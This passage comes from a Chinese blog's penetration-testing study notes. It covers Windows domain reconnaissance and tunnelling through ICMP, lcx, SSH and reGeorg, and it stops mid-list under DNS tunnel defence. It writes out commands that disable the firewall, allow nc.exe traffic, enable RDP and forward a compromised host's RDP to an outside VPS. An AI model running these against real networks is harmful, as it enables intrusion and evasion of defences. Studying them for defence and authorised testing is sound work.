<h2 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h2><p><code>net statistics workstation</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419201410.png"></p>
<h2 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h2><p><code>net user</code><br>通过获得用户列表，可以猜测在域中机器是如何命名。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419201443.png"></p>
<p>执行如下命令，获得本地管理员(通常包括域用户信息)<br><code>net localgroup administrators</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419201901.png"><br>本地管理员有一个用户一个组。在Domain Admins组中的成员会成为域内机器的本地管理员。</p>
<p>执行如下命令查看当前在线用户<br><code>query user || qwinsta</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419202137.png"></p>
<h2 id="列出本地计算机与所连接的客户端之间的会话"><a href="#列出本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出本地计算机与所连接的客户端之间的会话"></a>列出本地计算机与所连接的客户端之间的会话</h2><p><code>net session</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419202240.png"></p>
<h2 id="查询端口信息"><a href="#查询端口信息" class="headerlink" title="查询端口信息"></a>查询端口信息</h2><p><code>netstat -ano</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419202407.png"><br>可以查看当前计算机与那些计算机有连接，以及TCP端口，UDP端口的情况。</p>
<h2 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h2><p><code>Systeminfo</code><br>查看系统详细信息。包含系统版本，域，补丁等信息。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419202644.png"></p>
<p>使用wmic命令查看系统补丁<br><code>wmic qfe get Caption,Description,HotFiexId,InstalledOn</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419202825.png"></p>
<h2 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h2><p>通过net查看本机共享列表和可访问的域共享列表<br><code>net share</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419203032.png"><br>通过wmic命令查看共享列表<br><code>wmic share get  name, path, status</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419203124.png"></p>
<h2 id="查询路由表和可用的ARP缓存"><a href="#查询路由表和可用的ARP缓存" class="headerlink" title="查询路由表和可用的ARP缓存"></a>查询路由表和可用的ARP缓存</h2><p><code>route print</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419203241.png"><br><code>arp -a</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419203306.png"></p>
<h2 id="查询防火墙信息"><a href="#查询防火墙信息" class="headerlink" title="查询防火墙信息"></a>查询防火墙信息</h2><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>Win 2003及以前版本<br><code>netsh firewall set opmod disable</code></p>
<p>Win 2003之后的版本<br><code>netsh advfirewall set allprofiles state off</code></p>
<h3 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h3><p><code>netsh firewall show config</code></p>
<h3 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h3><ul>
<li><p>允许指定程序进站</p>
</li>
<li><p>win 2003及之前的版本<br><code>netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</code></p>
</li>
<li><p>win2003之后的版本<br><code>netsh advfirewall firewall add rule name=&quot;pass nc &quot; dir=in action=allow program=&quot;C: \nc.exe&quot;</code></p>
</li>
<li><p>允许指定程序出站<br><code>netsh advfirewall firewall add rule name=&quot;pass nc &quot; dir=out action=allow program=&quot;C: \nc.exe&quot;</code></p>
</li>
<li><p>允许3389端口进站<br><code>netsh advfirewall firewall add rule name=&quot;RDP &quot; protocol=TCP dir=in localport=3389 action=allow</code></p>
</li>
<li><p>自定义防火墙日志的存储位置<br><code>netsh advfirewall set currentprofile logging filename &quot;D:\firewall.log&quot;</code></p>
</li>
</ul>
<h2 id="查看代理配置"><a href="#查看代理配置" class="headerlink" title="查看代理配置"></a>查看代理配置</h2><p>通过如下命令查看服务器127.0.0.1 的 1080端口代理配置信息<br><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419204854.png"></p>
<h2 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h2><ol>
<li><p>查看远程桌面连接端口<br><code>REG query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220419205508.png"><br>0x3d转换即为3389端口</p>
</li>
<li><p>在Win 2003中开始3389端口<br><code>wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</code></p>
</li>
<li><p>在Win2008 和 2012中开始3389端口<br><code>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call set allowtsconnections 1</code><br><code>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired1</code><br><code>reg add&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d0 /f</code></p>
</li>
</ol>
<h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><h3 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h3><p><code>whoami</code><br>输入命令查看当前权限.可能有三种情况</p>
<ul>
<li>本地普通用户<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420182603.png"></li>
<li>本地管理员<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420182811.png"></li>
<li>域内用户<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420182645.png"></li>
</ul>
<h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><p><code>whoami /all</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420183012.png"><br>当前用户SID为<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420183109.png"></p>
<h3 id="查询指定用户的详细信息"><a href="#查询指定用户的详细信息" class="headerlink" title="查询指定用户的详细信息"></a>查询指定用户的详细信息</h3><p><code>net user xxx /domain</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420183344.png"></p>
<h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><ol>
<li>ipconfig /all</li>
</ol>
<p>通过<code>ipconfig /all</code>可以判断当前使用DNS服务器。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420183840.png"><br>然后通过<code>nslookup</code>反查解析域名的IP地址，判断DC和DNS服务器是否在同一台机器上。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420184040.png"></p>
<p>2.查看系统详细信息<br><code>systeminfo</code><br>通过<code>systeminfo</code>命令查看系统相关信息。如果显示域字段即为当前域服务器域名。登录服务器即为DC。如果显示域为<code>WORKGROUP</code>则，当前服务器不再域内。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420184422.png"></p>
<ol start="3">
<li>查询当前登录域和登录用户信息</li>
</ol>
<p><code>net config workstation</code><br>登录域显示当前是本地用户还是域用户。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420184801.png"></p>
<p>4.判断主域</p>
<p><code>net time /domain</code><br>执行后发生三种情况</p>
<ul>
<li>当前为域用户<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420184933.png"></li>
<li>不存在域<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420184957.png"></li>
<li>当前用户不是域用户<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220420185019.png"></li>
</ul>
<h2 id="判断域内存活主机"><a href="#判断域内存活主机" class="headerlink" title="判断域内存活主机"></a>判断域内存活主机</h2><h3 id="使用Empire-Arp-Scan模块判断"><a href="#使用Empire-Arp-Scan模块判断" class="headerlink" title="使用Empire Arp-Scan模块判断"></a>使用Empire Arp-Scan模块判断</h3><p>使用Empire <code>Arpscan</code>模块扫描对应的存活主机</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422185348.png"></p>
<h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>使用telnet命令可以快速探测对应的端口是否开启<br><code>telnet 192.168.1.1 53</code><br>如果端口开始telnet会连接<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422185656.png"></p>
<h2 id="收集域内基本信息"><a href="#收集域内基本信息" class="headerlink" title="收集域内基本信息"></a>收集域内基本信息</h2><ol>
<li><p>查询域<br><code>net view /domain</code></p>
</li>
<li><p>查询域内所有计算机<br><code>net view /domain:HACKE</code></p>
</li>
<li><p>查询域内所有用户组列表</p>
</li>
</ol>
<p><code>net group /domain</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422190922.png"><br>默认情况下 <code>Doamin Admins</code>和<code>Enterprise Admins</code>对域内所有域控拥有完全控制权</p>
<ol start="4">
<li> 查询所有域成员计算机列表</li>
</ol>
<p><code>net group &quot;domain computers&quot; /domain</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422191321.png"><br>5. 获取域密码信息</p>
<p><code>net accounts /domain</code><br>获取关于密码的相关信息如密码长度，错误锁定信息</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422191139.png"></p>
<ol start="6">
<li>获取域信任信息</li>
</ol>
<p><code>nltest /domain_trusts</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422191355.png"></p>
<h2 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h2><ol>
<li>查看DC机器名</li>
</ol>
<p><code>nltest /DCLIST:HACKE</code><br>可以发现DC机器名为”DC”<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422191514.png"></p>
<ol start="2">
<li>查看DC主机名</li>
</ol>
<p><code>Nslookup -type=srv_ldap._tcp</code><br>域主机名为”dc”<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422191645.png"></p>
<ol start="3">
<li>查看当前时间</li>
</ol>
<p><code>net time /domain</code><br>一般情况下时间服务器为主DC<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422191729.png"></p>
<ol start="4">
<li>查看域控制器组</li>
</ol>
<p><code>net group &quot;Domain Controllers&quot; /domain</code><br>一般情况下域中存在多台DC，当主域控故障时，备用域控可以启作用。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422191859.png"></p>
<p>使用如下命令可以看到域控的机器名为”DC”<br><code>netdom query pdc</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422192022.png"></p>
<h2 id="获取域内用户信息和管理员信息"><a href="#获取域内用户信息和管理员信息" class="headerlink" title="获取域内用户信息和管理员信息"></a>获取域内用户信息和管理员信息</h2><h3 id="查询所有域用户列表"><a href="#查询所有域用户列表" class="headerlink" title="查询所有域用户列表"></a>查询所有域用户列表</h3><ol>
<li>向DC查询</li>
</ol>
<p><code>net user /domain</code><br>krbtgt可以建立票据服务的加密密钥<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220422192216.png"></p>
<ol start="2">
<li>获得域内用户详细信息</li>
</ol>
<p>执行如下命令，获得域内用户详细信息。如用户名，描述信息，SID，域名，状态等.<br><code>wmic account get /all</code></p>
<ol start="3">
<li><p>查看存在的用户<br>查看域内存在用户<br><code>dsquery user</code> </p>
</li>
<li><p>查询本地管理员组用户</p>
</li>
</ol>
<p><code>net localgroup administrators</code></p>
<h3 id="查询域管理员用户"><a href="#查询域管理员用户" class="headerlink" title="查询域管理员用户"></a>查询域管理员用户</h3><ol>
<li>查询域管理员用户</li>
</ol>
<p><code>net group &quot;domain admins&quot; /domain</code></p>
<ol start="2">
<li>查询域管理员用户组</li>
</ol>
<p><code>net group &quot;Enterprise Admins&quot; /domain</code></p>
<h2 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h2><p>使用Empire  user_hunter模块</p>
<h2 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h2><h3 id="本机检查"><a href="#本机检查" class="headerlink" title="本机检查"></a>本机检查</h3><ol>
<li>获得域管理员列表</li>
</ol>
<p><code>net group &quot;Domain Admins&quot; /domain</code></p>
<p>可以发现当前只有一个域管理员<code>Administrator</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424100914.png"></p>
<ol start="2">
<li>列出本机所有进程以及进程用户</li>
</ol>
<p><code>tasklist /v</code></p>
<p>通过这个找出当前存在的域管理员的进程</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424101104.png"></p>
<h3 id="查询域控制器的域用户会话"><a href="#查询域控制器的域用户会话" class="headerlink" title="查询域控制器的域用户会话"></a>查询域控制器的域用户会话</h3><p>在DC中查询域用户会话列表，将其与域管理员列表进行对比，从而得到域管理员会话列表。注:需要查询所有DC</p>
<ol>
<li>查询DC列表</li>
</ol>
<p><code>net group &quot;domain Controllers&quot; /domain</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424101847.png"></p>
<ol start="2">
<li>查询域管理员列表</li>
</ol>
<p><code>net group &quot;Domain Admins&quot; /domain</code></p>
<ol start="3">
<li>收集所有活动域的会话列表</li>
</ol>
<p>使用<code>netsess.exe</code>查询所有DC。收集所有活动域会话列表。可以返回活动会话的IP ,域帐号， 会话开始时间.</p>
<p><code>Netsess -h</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424102152.png"></p>
<ol start="4">
<li>对比域管理员列表和活动会话列表</li>
</ol>
<p>通过对比域管理员列表和活动会话列表可以确定那些IP有活动域令牌</p>
<h2 id="使用PowerShell收集域信息"><a href="#使用PowerShell收集域信息" class="headerlink" title="使用PowerShell收集域信息"></a>使用PowerShell收集域信息</h2><p>使用PowerView对域内信息收集。它集成在<code>PowerSploit</code>工具包中.<br>进入<code>PowerSploit</code>中的<code>Recon</code>文件夹后使用命令<code>Import-Module .\PowerView.ps1</code>导入脚本。<br>之后可以使用<code>PowerVIew</code>的命令。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424103806.png"><br>常用命令如下<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424104155.png"></p>
<h2 id="BloodHound域分析工具"><a href="#BloodHound域分析工具" class="headerlink" title="BloodHound域分析工具"></a>BloodHound域分析工具</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>运行BloodHunter需要neo4j数据库，而neo4j数据库又需要Java环境的支持。现在最新的neo4j需要Java11以上的版本。在neo4j官网下载社区服务模块下载windows的neo4j安装包。进入bin目录，在cmd中运行<code>neo4j.bat console</code>运行neo4j服务。</p>
<p>服务成功启动后在进入<code>127.0.0.1:7474/browser</code>进入配置页面。<br>neo4j的默认配置为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HOST: bolt://127.0.0.1:7687</span><br><span class="line">username : neo4j</span><br><span class="line">password : neo4j</span><br></pre></td></tr></table></figure>
<p>输入默认用户名密码后提示我们修改密码。修改密码后进入neo4j页面。现在neo4j安装成功接着安装<code>BloodHound</code>软件.</p>
<p>在Github上下载对应的二进制文件，解压后进入对应目录打开<code>BloodHound.exe</code>文件。进入如下页面。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424154103.png"></p>
<p>输入之前的用户名，密码。进入BloodHound。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424154446.png"></p>
<p>但是如果需要显示图形，还需要对应的域信息。</p>
<ul>
<li>那些用户登录那些机器的信息</li>
<li>那些用户管理员有管理员权限</li>
<li>用户和组的归属关系</li>
</ul>
<p>BloodHound给出了两种方式收集信息在dithub源码中的collectors目录中。分别是</p>
<ul>
<li>AzureHound.ps1</li>
<li>SharpHound.exe</li>
</ul>
<p>运行SharpHound出现错误</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424161450.png"><br>需要安装.netFramework 4.6后即可正常运行</p>
<p>使用命令<code>sharHound.exe -c all</code> 获取信息.使用后会在当前目录生成一个.zip文件和一个.BIN文件.</p>
<p>将压缩包文件通过移到到BloodHound页面上取Node信息以外的页面即可导入。<br>导入之后都左侧<code>Database Info</code>可以看到相关的信息。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424163226.png"></p>
<p>现在在左侧<code>Analysis</code>点击对应的预设定选项可以显示出对应的路径<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220424164124.png"></p>
<p>按<code>Ctrl</code>可以调节三个等级是否显示节点名称。同时点击计算机，在nodeinfo选项可以显示对应的计算机信息。</p>
<h2 id="域内网段划分以及拓扑结构"><a href="#域内网段划分以及拓扑结构" class="headerlink" title="域内网段划分以及拓扑结构"></a>域内网段划分以及拓扑结构</h2><h3 id="域内网段划分"><a href="#域内网段划分" class="headerlink" title="域内网段划分"></a>域内网段划分</h3><p>首先需要判断网段是怎么划分。按照部门划分，安装楼层划分，还是按照地区划分。同时内网也分为DMZ区， 核心区， 办公区.</p>
<ol>
<li>DMZ</li>
</ol>
<p>在实际过程中在大多数情况下，外网拿到的Shell都处于DMZ区。这个区域并不能算是严格意义上的内网。如果防火墙配置合理，在DMZ区中可能存在，内网可以访问DMZ，但是DMZ不能访问内网的情况下。</p>
<ol start="2">
<li>办公区</li>
</ol>
<p>办公区一般来说就是日常工作区。在一般情况下办公区的防护并不是很高，基本是杀毒软件和主机检测产品。如果进入办公区可以使用内网信任关系扩大攻击面。</p>
<ol start="3">
<li>核心区</li>
</ol>
<p>核心区一般存放这企业最重要的数据，文档信息。(如DC , 核心生产机器等),安全设置也最为严格。</p>
<h3 id="多层域结构"><a href="#多层域结构" class="headerlink" title="多层域结构"></a>多层域结构</h3><p>在分析域内网段的基础上可以尝试分析域结构。<br>大型企业内网一般存在多层 甚至多级域结构。在测试时首先需要判断当前内网中是否存在多层域， 当前计算机在几级子域，该子域的DC以及根域的DC是那些。其他域的DC是那些，不同域之间是否存在域信任关系等。</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全攻防笔记3</title>
    <url>/2022/04/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<h1 id="隐藏隧道技术"><a href="#隐藏隧道技术" class="headerlink" title="隐藏隧道技术"></a>隐藏隧道技术</h1><h2 id="隐藏隧道概述"><a href="#隐藏隧道概述" class="headerlink" title="隐藏隧道概述"></a>隐藏隧道概述</h2><p>隧道是指绕过端口屏蔽的方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行通信。<br>常用的隧道:</p>
<ul>
<li>网络层: IPV6隧道， ICMP隧道, GRE隧道</li>
<li>传输层: TCP隧道 ， UDP隧道, 常规端口转发</li>
<li>应用层: SSH隧道 ， HTTP隧道 ， HTTPS隧道， DNS隧道</li>
</ul>
<span id="more"></span>

<h2 id="判断内网联通性"><a href="#判断内网联通性" class="headerlink" title="判断内网联通性"></a>判断内网联通性</h2><p>判断各种协议(TCP, HTTP, DNS, ICMP等)以及端口的情况。常见端口有80,8080,443,53,110,123等。判断联通性方法</p>
<ol>
<li>ICMP协议</li>
</ol>
<p>通过ping命令判断，使用ICMP协议<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429161739.png"></p>
<ol start="2">
<li>TCP协议</li>
</ol>
<p>使用nc。通过TCP协议判断端口以及主机的联通性。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429162658.png"></p>
<p>3.HTTP 协议</p>
<p>通过CURL判断对应端口是否开启。如果端口开启会发送对应的端口信息。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429162925.png"></p>
<ol start="4">
<li>DNS协议</li>
</ol>
<p>Winodws使用 nslookup，Linux使用 dig命令。</p>
<p>还有一种情况,流量不能直接流出，需要经过企业的代理服务器。判断方法</p>
<ul>
<li>查看内网是否有名称为Proxy的机器</li>
<li>查看IE的直接代理</li>
<li>下载PAC文件路径</li>
<li>根据 CURL命令查看<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CURL www.baidu.com //不通</span><br><span class="line">CURL -x proxy-ip:port www.baidu.com //通</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h2><p>网络层中常用的两个隧道协议是IPv6和ICMP。</p>
<h3 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h3><p>使用IPv6隧道时。将IPv6的报文封装在IPv4报文中，通过IPv4的方法到达目的地。在到达目的地后目标解除IPv4封装，取出IPv6报文。因为现在的安全设备无法检测IPv6通信数据，可以避开安全设置的检测。</p>
<p>支持IPv6隧道的工具有 socat, 6tunnel, nt6tunnel等</p>
<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>在网络环境中如果各类上层协议隧道(HTTP隧道， DNS隧道， 常规的正反向端口转发)都失败了。可以尝试建立ICMP隧道。常用的ICMP隧道工具有 icmpsh, PingTunnel, icmptunnel, powershell icmp等</p>
<ol>
<li>icmpsh</li>
</ol>
<p>icmpsh可以跨平台使用，而且使用时不需要管理员权限。</p>
<p>需要安装python 的 impacket库，用于方便对于TCP,UDP,ICMP,IGMP,ARP,IPv4, IPv6, SMB, MSRPC, NTLM, Kerberos, WMI, LDAP等协议的访问。</p>
<p><code>apt-get install python-impacket</code><br>这里需要使用pip python2版本使用如下命令<br><code>pip2 install impacket</code></p>
<p>因为icmpsh工具要替代系统本身的ping命令应答程序，需要关闭系统本身的ICMP应答。(恢复系统应答，应该设置为0)，否则Shell无法进行交互。</p>
<p><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p>
<p>需要修改run.sh中IP为机器本身IP<br>使用<code>./run.sh</code>运行。</p>
<p>提示我们输入目标公网ip地址和目标机器使用命令</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220429173853.png"></p>
<p>在目标机器使用命令后建立icmp隧道，使用ipconfig查看目标ip</p>
<h3 id="防御ICMP隧道方法"><a href="#防御ICMP隧道方法" class="headerlink" title="防御ICMP隧道方法"></a>防御ICMP隧道方法</h3><p>一般防火墙会运行ICMP流量通过，但是使用ICMP隧道会产生大量ICMP流量。我们可以使用Whireshark进行ICMP流量分析，以检测ICMP流量。</p>
<ul>
<li>检测同一来源的ICMP数据包流量。一个ping命令正常每秒产生两个数据包，但是使用ICMP隧道在很短的时间内产生大量流量包。</li>
<li>注意那些Payload大于64bit的ICMP流量包</li>
<li>寻找响应数据包中Payload和请求数据包中Payload不一致的ICPM数据包</li>
<li>检查ICMP数据包标签。比如icmptunnel会在所有的ICMP Payload前添加”TUNL”标记来标识隧道。</li>
</ul>
<h2 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h2><h3 id="Lcx端口转发"><a href="#Lcx端口转发" class="headerlink" title="Lcx端口转发"></a>Lcx端口转发</h3><p>Lcx是一个基于Socket套接字的端口转发工具有Windows和Linux两个版本。Windows版本为lcx.exe.Linux版为portmap.一个Socket隧道需要具备两端:一端为服务端，监听一个端口等待客户端连接。一端为客户端需要输入服务端的IP地址和端口，主动与服务端连接。</p>
<ol>
<li>内网端口转发</li>
</ol>
<p>在公网vps上监听4444端口，并将流量转发到5555端口。<br><code>lcx.exe -listen 4444 5555</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220430142810.png"></p>
<p>在目标机器上执行命令，将3389端口的所有流量转发到公网vps上的4444端口<br><code>lcx.exe -slave 192.168.1.5 4444 127.0.0.1 3389</code></p>
<p>这时在vps上会显示有机器已连接4444端口.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220430142948.png"></p>
<p>此时使用mstsc登录<code>&lt;公网ip:端口&gt;</code>或者直接在vps上使用mstsc登录127.0.0.1的5555端口，即可访问目标服务器的3389.</p>
<ol start="2">
<li>本地端口映射</li>
</ol>
<p>如果目标服务器防火墙不允许特定端口的数据经过防火墙(如3389)，可以将对应端口的流量转发的防火墙可以通过的端口如53.此时可以直接连接目标机器的53端口。</p>
<p><code>lcx -tran 53 127.0.0.1 3389</code></p>
<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h2><p>应用层隧道主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH, HTTP/HTTPS, DNS</p>
<p>.</p>
<h3 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h3><p>在日常中几乎所有的Linu\Unix和网络设备都支持SSH协议。防火墙一般也不会拦截SSH协议。同时SSH协议使用时是加密的，所以很难识别SSH是合法的还是恶意的。</p>
<p>SSH常用参数</p>
<ul>
<li>-C: 压缩传输，提高传输速度</li>
<li>-f: 将SSH传输转入后台，不占用当前Shell</li>
<li>-N: 建立静默连接(建立了连接，但是看不到具体会话)</li>
<li>-g: 允许远程主机连接本地用于转发的端口</li>
<li>-L: 本地端口转发</li>
<li>-R:远程端口转发</li>
<li>-D:动态转发(SOCKS代理)</li>
<li>-P:指定SSH端口</li>
</ul>
<ol>
<li>本地端口转发</li>
</ol>
<p>将本地的端口流量，通过控制主机转发到目标主机指定端口上。在本地主机无法访问目标主机，但是控制主机可以访问目标主机时使用。</p>
<p>在VPS使用如下命令<br><code>ssh -CfNg -L 1153(VPS本地端口):1.1.1.10(目标主机):3389(目标端口) root@192.168.1.1(控制主机)</code></p>
<p>在VPS访问1153端口即可与1.1.1.10建立连接<br><code>rdesktop 127.0.0.1:1153</code></p>
<ol start="2">
<li>远程端口转发</li>
</ol>
<p>将远程端口的流量通过自己转发到目标主机的指定端口。<br>在内网中被控主机使用命令<br><code>ssh -CfNg -R 3307(VPS端口):1.1.1.10(目标主机):3389(目标端口) root@192.168.1.4(远程VPS主机)</code></p>
<p>在VPS访问3307端口，与1.1.1.10建立连接<br><code>rdesktop 127.0.0.1:3307</code></p>
<p>本地转发是将本地端口流量通过远程主机转发到指定主机和端口<br>远程转发是将远程端口流量通过自己转发到对应主机端口</p>
<ol start="3">
<li>动态转发</li>
</ol>
<p>在VPS上使用命令，建立动态SOCK5代理通道，需要目标主机密码。<br><code>ssh -CfNg -D 70000 root@192.168.1.1</code></p>
<p>支持Sock4/5的程序设置代理后都可以使用加密通道进行流量访问</p>
<ol start="4">
<li>防御SSH隧道思路</li>
</ol>
<p>在系统中设置SSH远程管理白名单,在ACL中设置特定的IP连接SSH。</p>
<h3 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a>HTTP/HTTPS协议</h3><p>HTTPService代理用于将所有的流量转发到内网。常见的代理工具有 reGeorg ,  meterpreter , tunna等。</p>
<p>reGeorg支持ASPX , PHP , JSP 等Web脚本，并特别提供了一个Tomcat5版本。</p>
<p>将脚本上传的目标服务器上，访问目标服务器的tunnel.jsp文件。返回后使用reGeoegSocksProxy.py脚本将监听本地9999端口，既可以建立一个通信链路.</p>
<p>使用如下命令<br><code>python reGeorgSocksProxy.py -u http://192.168.184.149:8080/tunnel.jsp -p 9999</code></p>
<p>建立隧道后可以使用ProxyChains类似的工具访问目标内网中的资源。比如暴力破解3389端口。</p>
<h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>DNS隧道的工作原理为:在进行DNS查询的时，如果目标域名不在本地的DNS服务器中时。DNS服务器会再次询问外网的DNS服务器，然后返回结果。如果在互联网网有一台DNS服务器，通过DNS解析协议即可进行数据包交换。DNS协议本来返回的结果为IP地址，但是返回的可以是任意的字符串和加密的指令。</p>
<p>在使用DNS隧道时在表面上没有连接外网(内网的网关没有转发IP数据包)，但实际上DNS服务器完成了数据包的转发,将其他协议封装在DNS协议内进行传输。</p>
<p>实验需要域名，以后再说。</p>
<p>4.防御DNS隧道攻击的方法</p>
<ul>
